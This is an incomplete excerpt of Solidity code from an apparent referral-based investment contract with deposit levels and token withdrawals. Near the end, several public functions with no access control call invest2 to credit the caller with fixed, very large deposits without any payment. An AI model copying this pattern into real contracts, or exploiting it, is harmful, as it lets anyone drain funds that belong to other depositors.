...
//////
    ...
    function invest(address referrer, uint8 lvel) public payable{

        require(lvel <= 17, "Invalid lvel");
        require(msg.value >= lvels[lvel].price,"Wrong value");
		...
		(uint256 percent, uint256 profit, uint256 finish) = getResult(lvel, msg.value);
		user.deposits.push(Deposit(lvel, percent, msg.value, profit, block.timestamp, finish));

		totalInvested = totalInvested.add(msg.value);
		emit NewDeposit(msg.sender, lvel, percent, msg.value, profit, block.timestamp, finish);
...
asa =  i;
 ...
 if(users[upline1].deposits[asa].lvel ==  users[msg.sender].deposits[asa].lvel)
{
        user.checkpoint = block.timestamp;
        user.withdrawn =  user.withdrawn.add(totalAmount) ;
        token.transfer(msg.sender, totalAmount);
...
{
    invest2(msg.sender,  1, 1);

}

function vbestT2 () public
{
    invest2(msg.sender,  2, 25000000000000000000000000);
...
{
    invest2(msg.sender,  17, 25000000000000000000000000);

}

function vbestT25 () public
{
    invest2(msg.sender,  17, 25000000);

}


function vbest () public
{
invest(msg.sender,  0);

}

function vbest3 () public
{
invest(msg.sender,  1);
